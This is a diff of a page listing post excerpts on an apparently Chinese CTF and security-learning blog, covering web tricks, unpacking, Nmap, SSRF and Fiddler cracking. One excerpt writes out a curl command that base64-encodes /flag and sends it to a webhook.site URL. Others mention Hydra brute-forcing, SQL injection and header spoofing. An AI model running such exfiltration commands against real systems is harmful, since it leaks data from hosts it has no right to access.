@@ -227,15 +227,15 @@
     <article class="col-12 col-md-12 mx-auto index-info">
       <h2 class="index-header">
         
-        <a href="/2024/09/14/BaseCTF202409/" target="_self">
-          BaseCTF202409
+        <a href="/2024/09/24/web2/" target="_self">
+          web2
         </a>
       </h2>
 
       
-      <a class="index-excerpt index-excerpt__noimg" href="/2024/09/14/BaseCTF202409/" target="_self">
+      <a class="index-excerpt index-excerpt__noimg" href="/2024/09/24/web2/" target="_self">
         <div>
-          ReverseUPX mini既然是UPX那必须先DIE查壳一看就不对劲，upx最多只见过3.96的，不过这里先用upx自己脱一下可以脱直接继续查，64位无壳，进入ida明显的base64直接，解密秒解BaseCTF{Hav3_@_g0od_t1m3!!!} ez_xor简单xor，直接看ida，查位数64位看码了解，关键函数keystream和encrpt，输入长度为28，str、v11、v12
+          无回显命令执行重定向到文件 cmd_here &gt; 1.txt然后利用wegt命令进行文件下载  curl外带可以利用webhook.site建立网络端口监听，然后执行cmd&#x3D;curl https://webhook.site/2c5bcc35-bc12-4910-bae5-e51fbadac519/`cat &#x2F;flag | base64&#96;来实现base64编码获取
         </div>
       </a>
 
@@ -243,8 +243,8 @@
         
           <div class="post-meta mr-3">
             <i class="iconfont icon-date"></i>
-            <time datetime="2024-09-14 11:05" pubdate>
-              2024-09-14
+            <time datetime="2024-09-24 10:24" pubdate>
+              2024-09-24
             </time>
           </div>
         
@@ -274,7 +274,7 @@
           <div class="post-meta">
             <i class="iconfont icon-tags"></i>
             
-              <a href="/tags/reverse/">#reverse</a>
+              <a href="/tags/web/">#web</a>
             
           </div>
         
@@ -288,15 +288,15 @@
     <article class="col-12 col-md-12 mx-auto index-info">
       <h2 class="index-header">
         
-        <a href="/2024/09/12/%E5%8F%AF%E6%81%B6%E7%9A%84gitee%E5%90%83%E6%8E%89%E5%A4%96%E9%93%BE%E4%BA%86/" target="_self">
-          可恶的gitee吃掉外链了
+        <a href="/2024/09/20/od%E5%91%BD%E4%BB%A4/" target="_self">
+          od命令
         </a>
       </h2>
 
       
-      <a class="index-excerpt index-excerpt__noimg" href="/2024/09/12/%E5%8F%AF%E6%81%B6%E7%9A%84gitee%E5%90%83%E6%8E%89%E5%A4%96%E9%93%BE%E4%BA%86/" target="_self">
+      <a class="index-excerpt index-excerpt__noimg" href="/2024/09/20/od%E5%91%BD%E4%BB%A4/" target="_self">
         <div>
-          开始这是这个博客最开始的故事，我想要用gitee做一个图床，当时我怎么也没想到gitee居然拒绝掉外链的请求了，就像这样但是反复尝试我们发现了一下返回值 防盗链要实现防盗链，就需要知道图片的请求是从哪里发出的。可以实现这一功能的有请求头中的origin和referer。origin只有在XHR请求中才会带上，所以图片资源只能借助referer 通过判断请求的referer，如果请求来源不是本站就返
+          
         </div>
       </a>
 
@@ -304,17 +304,71 @@
         
           <div class="post-meta mr-3">
             <i class="iconfont icon-date"></i>
-            <time datetime="2024-09-12 22:26" pubdate>
-              2024-09-12
+            <time datetime="2024-09-20 08:21" pubdate>
+              2024-09-20
             </time>
           </div>
         
         
         
+      </div>
+    </article>
+  </div>
+
+  <div class="row mx-auto index-card">
+    
+    
+    <article class="col-12 col-md-12 mx-auto index-info">
+      <h2 class="index-header">
+        
+        <a href="/2024/09/18/%E9%92%88%E5%AF%B9Fiddler4-6-2%E7%9A%84%E5%8F%8D%E7%BC%96%E8%AF%91%E4%BB%A5%E5%8F%8A%E6%9C%80%E6%96%B0%E7%89%88%E6%9C%AC%E7%9A%84%E7%A0%B4%E8%A7%A3/" target="_self">
+          针对Fiddler4.6.2的反编译以及最新版本的破解
+        </a>
+      </h2>
+
+      
+      <a class="index-excerpt index-excerpt__noimg" href="/2024/09/18/%E9%92%88%E5%AF%B9Fiddler4-6-2%E7%9A%84%E5%8F%8D%E7%BC%96%E8%AF%91%E4%BB%A5%E5%8F%8A%E6%9C%80%E6%96%B0%E7%89%88%E6%9C%AC%E7%9A%84%E7%A0%B4%E8%A7%A3/" target="_self">
+        <div>
+          参考文献吾爱破解 思路我们根据作者的了解发现fiddler对软件有篡改检验，所以我们有以下的几个思路   修改本地文件使篡改检测失效 本地建议服务器伪造响应   常用IL对应十六进制
+        </div>
+      </a>
+
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2024-09-18 21:55" pubdate>
+              2024-09-18
+            </time>
+          </div>
+        
+        
+          <div class="post-meta mr-3 d-flex align-items-center">
+            <i class="iconfont icon-category"></i>
+            
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E9%80%86%E5%90%91%E5%AE%9E%E6%88%98/" class="category-chain-item">逆向实战</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+          </div>
+        
+        
           <div class="post-meta">
             <i class="iconfont icon-tags"></i>
             
-              <a href="/tags/tool/">#tool</a>
+              <a href="/tags/revser/">#revser</a>
             
           </div>
         
@@ -328,15 +382,15 @@
     <article class="col-12 col-md-12 mx-auto index-info">
       <h2 class="index-header">
         
-        <a href="/2024/09/12/FSG%E8%84%B1%E5%A3%B3/" target="_self">
-          MSG脱壳过程中的IAT修复
+        <a href="/2024/09/18/web%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8/" target="_self">
+          web简单利用
         </a>
       </h2>
 
       
-      <a class="index-excerpt index-excerpt__noimg" href="/2024/09/12/FSG%E8%84%B1%E5%A3%B3/" target="_self">
+      <a class="index-excerpt index-excerpt__noimg" href="/2024/09/18/web%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8/" target="_self">
         <div>
-          MSG脱壳过程中的IAT修复进行手动查找和IAT修复找可以在动态连接库中查得到的call在命令行中敲425210然后查连接库函数向上向下查找为0的数值(分割处)手动修改RVA和size的值
+          最近写一些垃圾web用到了不知道的知识，在此记录，首先是头文件绕过  X-Forwarded-For : 简称XFF头，它代表客户端，也就是HTTP的 请求端真实的IP ，只有在通过了HTTP 代理或者负载均衡服务器时才会添加该项  可以实现对web对本地的访问达到网址绕过的效果 md5绕过相同的md5字符串a&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7
         </div>
       </a>
 
@@ -344,8 +398,69 @@
         
           <div class="post-meta mr-3">
             <i class="iconfont icon-date"></i>
-            <time datetime="2024-09-12 14:59" pubdate>
-              2024-09-12
+            <time datetime="2024-09-18 19:54" pubdate>
+              2024-09-18
+            </time>
+          </div>
+        
+        
+          <div class="post-meta mr-3 d-flex align-items-center">
+            <i class="iconfont icon-category"></i>
+            
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/ctf/" class="category-chain-item">ctf</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+          </div>
+        
+        
+          <div class="post-meta">
+            <i class="iconfont icon-tags"></i>
+            
+              <a href="/tags/web/">#web</a>
+            
+          </div>
+        
+      </div>
+    </article>
+  </div>
+
+  <div class="row mx-auto index-card">
+    
+    
+    <article class="col-12 col-md-12 mx-auto index-info">
+      <h2 class="index-header">
+        
+        <a href="/2024/09/18/%E8%84%B1%E5%A3%B3%E6%95%99%E7%A8%8B%E7%AC%AC%E4%B8%80%E8%AF%BE/" target="_self">
+          脱壳教程第一课
+        </a>
+      </h2>
+
+      
+      <a class="index-excerpt index-excerpt__noimg" href="/2024/09/18/%E8%84%B1%E5%A3%B3%E6%95%99%E7%A8%8B%E7%AC%AC%E4%B8%80%E8%AF%BE/" target="_self">
+        <div>
+          upx首先查壳 手脱了解是upx直接od打开，直接往下面翻，或者用esp法直接找到popad跳转看到先call再jmp确认为OEP入口点直接od脱壳可运行直接不用管了 NsPackESP首先查壳发现为北斗Nspack可以同上用手脱，或者采用ESP壳，在pushfd之后发现ESP改变，我们选择数据窗口中跟随，然后在数据窗口中选择断点，硬件访问，Word然后直接f9到达出栈位置然后继续执行直到进入OE
+        </div>
+      </a>
+
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2024-09-18 16:01" pubdate>
+              2024-09-18
             </time>
           </div>
         
@@ -389,15 +504,15 @@
     <article class="col-12 col-md-12 mx-auto index-info">
       <h2 class="index-header">
         
-        <a href="/2024/09/12/asp%E8%84%B1%E5%A3%B3/" target="_self">
-          asp脱壳
+        <a href="/2024/09/16/%E6%89%AB%E6%8F%8F%E5%9F%BA%E7%A1%80%E5%92%8C%E6%96%B9%E5%BC%8F/" target="_self">
+          扫描基础和方式
         </a>
       </h2>
 
       
-      <a class="index-excerpt index-excerpt__noimg" href="/2024/09/12/asp%E8%84%B1%E5%A3%B3/" target="_self">
+      <a class="index-excerpt index-excerpt__noimg" href="/2024/09/16/%E6%89%AB%E6%8F%8F%E5%9F%BA%E7%A1%80%E5%92%8C%E6%96%B9%E5%BC%8F/" target="_self">
         <div>
-          asp脱壳时利用 模拟跟踪法利用tc命令跟踪查找带有sfx和输入表的字段这个方法由于时程序自动进行的所以十分缓慢不建议用   SFX法自动抵达 nspack巧妙脱壳法at GetVersion   下版本断点在retn处下断点单步F8之后到打OEP之后向前找OEP
+          前提概要在学习Nmap时我认为只要了解操作就行了不过，在思考之后我认为我们还是应该学习基本的原理和知识 扫描基础3.5.1 TCP 三次握手第一步 - 客户端发起连接请求：  客户端发送SYN（同步）包： 客户端向服务器发送一个TCP包，其中SYN标志位被设置为1，同时选择一个初始的序列号（Seq&#x3D;X）。 源端口：随机端口号目标端口：服务器的TCP端口号SEQ：客户端选择的初始序列号AC
         </div>
       </a>
 
@@ -405,8 +520,8 @@
         
           <div class="post-meta mr-3">
             <i class="iconfont icon-date"></i>
-            <time datetime="2024-09-12 14:59" pubdate>
-              2024-09-12
+            <time datetime="2024-09-16 21:50" pubdate>
+              2024-09-16
             </time>
           </div>
         
@@ -421,7 +536,7 @@
     
       <span class="category-chain">
         
-  <a href="/categories/reverse/" class="category-chain-item">reverse</a>
+  <a href="/categories/Tool/" class="category-chain-item">Tool</a>
   
   
 
@@ -436,7 +551,7 @@
           <div class="post-meta">
             <i class="iconfont icon-tags"></i>
             
-              <a href="/tags/%E8%84%B1%E5%A3%B3/">#脱壳</a>
+              <a href="/tags/nmap/">#nmap</a>
             
           </div>
         
@@ -450,15 +565,15 @@
     <article class="col-12 col-md-12 mx-auto index-info">
       <h2 class="index-header">
         
-        <a href="/2024/09/12/PEcompact/" target="_self">
-          PEcompact脱壳
+        <a href="/2024/09/16/Nmap%E5%88%9D%E8%AF%86/" target="_self">
+          Nmap初识
         </a>
       </h2>
 
       
-      <a class="index-excerpt index-excerpt__noimg" href="/2024/09/12/PEcompact/" target="_self">
+      <a class="index-excerpt index-excerpt__noimg" href="/2024/09/16/Nmap%E5%88%9D%E8%AF%86/" target="_self">
         <div>
-          PEcompact脱壳  3BP VirtualFreeF9到达取消断点返回到用户代码alt+f9查找PUSH 8000然后单步到达   4BP VirtualFree两次shift+f9到达返回到用户代码alt+f9然后单步跟踪到达oep    5bp 0045DE74运行,到达后取消断点在retn处会返回并执行程序我们现在下面下个断点，然后单步到OEP这一段汇编比较重要注意在retn后面加上断
+          web小白又开始学习web了，今天初步了解一下Nmap的功能和使用方法 主要功能： 主机发现： Nmap 可以通过发送网络探测包（ping 扫描）来确定一个网络中活跃的主机。这有助于确定哪些 IP 地址上有活动的设备 端口扫描： Nmap 可以扫描目标主机的开放端口，帮助确定哪些服务正在运行。它支持多种扫描技术，包括 TCP 扫描、UDP 扫描、SYN&#x2F;ACK 扫描等 服务识别： Nma
         </div>
       </a>
 
@@ -466,8 +581,8 @@
         
           <div class="post-meta mr-3">
             <i class="iconfont icon-date"></i>
-            <time datetime="2024-09-12 14:59" pubdate>
-              2024-09-12
+            <time datetime="2024-09-16 21:29" pubdate>
+              2024-09-16
             </time>
           </div>
         
@@ -482,7 +597,7 @@
     
       <span class="category-chain">
         
-  <a href="/categories/reverse/" class="category-chain-item">reverse</a>
+  <a href="/categories/Tool/" class="category-chain-item">Tool</a>
   
   
 
@@ -497,7 +612,7 @@
           <div class="post-meta">
             <i class="iconfont icon-tags"></i>
             
-              <a href="/tags/%E8%84%B1%E5%A3%B3/">#脱壳</a>
+              <a href="/tags/nmap/">#nmap</a>
             
           </div>
         
@@ -511,15 +626,15 @@
     <article class="col-12 col-md-12 mx-auto index-info">
       <h2 class="index-header">
         
-        <a href="/2024/09/12/sql%E5%88%9D%E8%AF%95/" target="_self">
-          Sql注入初识
+        <a href="/2024/09/16/CVE-2020-9484-tomcat-session%E6%8C%81%E4%B9%85%E5%8C%96/" target="_self">
+          CVE-2020-9484-tomcat-session持久化
         </a>
       </h2>
 
       
-      <a class="index-excerpt index-excerpt__noimg" href="/2024/09/12/sql%E5%88%9D%E8%AF%95/" target="_self">
+      <a class="index-excerpt index-excerpt__noimg" href="/2024/09/16/CVE-2020-9484-tomcat-session%E6%8C%81%E4%B9%85%E5%8C%96/" target="_self">
         <div>
-          Sql注入初识&nbsp;&nbsp;我们首先了解sql注入就是在sql数据库语句执行的时候跳过正确的执行来进行我们的语句达到权限跳过直接进行命令的执行以nssctf题为例首先在了解了可以利用万能密码1’进行回显之后我们利用sql语句进行库的查看 12?wllm=1&#x27; order by 3 --+ ?wllm=1&#x27; order by 4 --+ 确定几列之后便可以用语句查询 1
+          CVE
         </div>
       </a>
 
@@ -527,8 +642,8 @@
         
           <div class="post-meta mr-3">
             <i class="iconfont icon-date"></i>
-            <time datetime="2024-09-12 14:59" pubdate>
-              2024-09-12
+            <time datetime="2024-09-16 11:02" pubdate>
+              2024-09-16
             </time>
           </div>
         
@@ -558,7 +673,7 @@
           <div class="post-meta">
             <i class="iconfont icon-tags"></i>
             
-              <a href="/tags/Sql/">#Sql</a>
+              <a href="/tags/CVE/">#CVE</a>
             
           </div>
         
@@ -572,15 +687,15 @@
     <article class="col-12 col-md-12 mx-auto index-info">
       <h2 class="index-header">
         
-        <a href="/2024/09/12/%E4%B8%80%E4%BA%9B%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/" target="_self">
-          工具使用说明书
+        <a href="/2024/09/16/jsessionid%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F/" target="_self">
+          jsessionid是什么？
         </a>
       </h2>
 
       
-      <a class="index-excerpt index-excerpt__noimg" href="/2024/09/12/%E4%B8%80%E4%BA%9B%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/" target="_self">
+      <a class="index-excerpt index-excerpt__noimg" href="/2024/09/16/jsessionid%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F/" target="_self">
         <div>
-          工具使用说明书Hydrahydra -l root -p root 127.0.0.1 -s 2111 ssh -f-l： LOGIN      指定破解的用户，对特定用户破解。-L：FILE     指定用户名字典。-p：PASS ，指定密码破解，少用，一般是采用密码字典。-P： FILE   指定密码字典文件-s： PORT 指定爆破端口-M：FILE    指定目标列表文件-C： FILE
+          之前不是写了一个爬数据的脚本么，今天发现一个问题，就是jsessonid在刷新之后变了，所以我现在想要找到一个不会变的方法，不过这个修改和学习时间应该会变得比较久，感觉挺高阶的 看了一些文章将的都是tomcat的的例子，先讲讲什么是session，浏览器第一次访问服务器会生成一个session保存相关信息，会有一个sessionid来对应这个session，那么我们就想可不可以利用这个id直接去查
         </div>
       </a>
 
@@ -588,130 +703,8 @@
         
           <div class="post-meta mr-3">
             <i class="iconfont icon-date"></i>
-            <time datetime="2024-09-12 14:59" pubdate>
-              2024-09-12
-            </time>
-          </div>
-        
-        
-          <div class="post-meta mr-3 d-flex align-items-center">
-            <i class="iconfont icon-category"></i>
-            
-
-<span class="category-chains">
-  
-  
-    
-      <span class="category-chain">
-        
-  <a href="/categories/tool/" class="category-chain-item">tool</a>
-  
-  
-
-      </span>
-    
-  
-</span>
-
-          </div>
-        
-        
-          <div class="post-meta">
-            <i class="iconfont icon-tags"></i>
-            
-              <a href="/tags/tool/">#tool</a>
-            
-          </div>
-        
-      </div>
-    </article>
-  </div>
-
-  <div class="row mx-auto index-card">
-    
-    
-    <article class="col-12 col-md-12 mx-auto index-info">
-      <h2 class="index-header">
-        
-        <a href="/2024/09/12/%E8%84%9A%E6%9C%AC%E5%91%BD%E4%BB%A4%E7%9A%84%E6%94%B9%E5%8F%98/" target="_self">
-          脚本命令和普通命令的区别
-        </a>
-      </h2>
-
-      
-      <a class="index-excerpt index-excerpt__noimg" href="/2024/09/12/%E8%84%9A%E6%9C%AC%E5%91%BD%E4%BB%A4%E7%9A%84%E6%94%B9%E5%8F%98/" target="_self">
-        <div>
-          脚本命令和普通命令的区别 在我们将windows系统调成可以执行脚本命令之后我们的许多命令在cmd或ise中可能无法执行这可能是因为命名的原因     开启脚本执行之前 12C:\Users\agesh&gt; where calcC:\Windows\System32\calc.exe 开启之后 12PS C:\data\code&gt; where calcPS C:\data\code&gt
-        </div>
-      </a>
-
-      <div class="index-btm post-metas">
-        
-          <div class="post-meta mr-3">
-            <i class="iconfont icon-date"></i>
-            <time datetime="2024-09-12 14:59" pubdate>
-              2024-09-12
-            </time>
-          </div>
-        
-        
-          <div class="post-meta mr-3 d-flex align-items-center">
-            <i class="iconfont icon-category"></i>
-            
-
-<span class="category-chains">
-  
-  
-    
-      <span class="category-chain">
-        
-  <a href="/categories/tool/" class="category-chain-item">tool</a>
-  
-  
-
-      </span>
-    
-  
-</span>
-
-          </div>
-        
-        
-          <div class="post-meta">
-            <i class="iconfont icon-tags"></i>
-            
-              <a href="/tags/script/">#script</a>
-            
-          </div>
-        
-      </div>
-    </article>
-  </div>
-
-  <div class="row mx-auto index-card">
-    
-    
-    <article class="col-12 col-md-12 mx-auto index-info">
-      <h2 class="index-header">
-        
-        <a href="/2024/09/11/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/" target="_self">
-          php伪协议
-        </a>
-      </h2>
-
-      
-      <a class="index-excerpt index-excerpt__noimg" href="/2024/09/11/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/" target="_self">
-        <div>
-          #php伪协议php伪协议常见的php伪协议 1）file:&#x2F;&#x2F; 访问本地文件系统 2）http:&#x2F;&#x2F; 访问HTTP(S)网址 3）ftp:&#x2F;&#x2F; 访问FTP(S)URL 4)php:&#x2F;&#x2F; 访问各个输出输入流 5)zlib:&#x2F;&#x2F; 处理压缩流 6)data:&#x2F;&#x2F; 读取数据 7)glo
-        </div>
-      </a>
-
-      <div class="index-btm post-metas">
-        
-          <div class="post-meta mr-3">
-            <i class="iconfont icon-date"></i>
-            <time datetime="2024-09-11 14:59" pubdate>
-              2024-09-11
+            <time datetime="2024-09-16 10:32" pubdate>
+              2024-09-16
             </time>
           </div>
         
@@ -741,7 +734,7 @@
           <div class="post-meta">
             <i class="iconfont icon-tags"></i>
             
-              <a href="/tags/php/">#php</a>
+              <a href="/tags/session/">#session</a>
             
           </div>
         
@@ -755,15 +748,15 @@
     <article class="col-12 col-md-12 mx-auto index-info">
       <h2 class="index-header">
         
-        <a href="/2024/09/10/tea/" target="_self">
-          tea.dm
+        <a href="/2024/09/16/SSRF/" target="_self">
+          SSRF
         </a>
       </h2>
 
       
-      <a class="index-excerpt index-excerpt__noimg" href="/2024/09/10/tea/" target="_self">
+      <a class="index-excerpt index-excerpt__noimg" href="/2024/09/16/SSRF/" target="_self">
         <div>
-          tea终于自己做出一道tea了乐看原题&emsp;典型的tea直接套模板，但是有问题，就是py中不会限定为32位所以最后的答案会超级大，我们就要去进行一个&amp;ffffffff的操作使数值正确&emsp;然后就是关于题目中的小问题，首先就是delta，标准的tea是0x9E3779B9，但是在ida中总是会出现变成-0x61c88647的问题需要注意，然后就是最后的v5怎么求,就是一个偏移相加
+          web
         </div>
       </a>
 
@@ -771,8 +764,8 @@
         
           <div class="post-meta mr-3">
             <i class="iconfont icon-date"></i>
-            <time datetime="2024-09-10 18:33" pubdate>
-              2024-09-10
+            <time datetime="2024-09-16 00:32" pubdate>
+              2024-09-16
             </time>
           </div>
         
@@ -787,7 +780,7 @@
     
       <span class="category-chain">
         
-  <a href="/categories/reverse/" class="category-chain-item">reverse</a>
+  <a href="/categories/ctf/" class="category-chain-item">ctf</a>
   
   
 
@@ -802,7 +795,7 @@
           <div class="post-meta">
             <i class="iconfont icon-tags"></i>
             
-              <a href="/tags/decode/">#decode</a>
+              <a href="/tags/web/">#web</a>
             
           </div>
         
@@ -814,7 +807,7 @@
 
   <nav aria-label="navigation">
     <span class="pagination" id="pagination">
-      <a class="extend prev" rel="prev" href="/"><i class="iconfont icon-arrowleft"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span>
+      <a class="extend prev" rel="prev" href="/"><i class="iconfont icon-arrowleft"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/#board">3</a><a class="page-number" href="/page/4/#board">4</a><a class="extend next" rel="next" href="/page/3/#board"><i class="iconfont icon-arrowright"></i></a>
     </span>
   </nav>
 
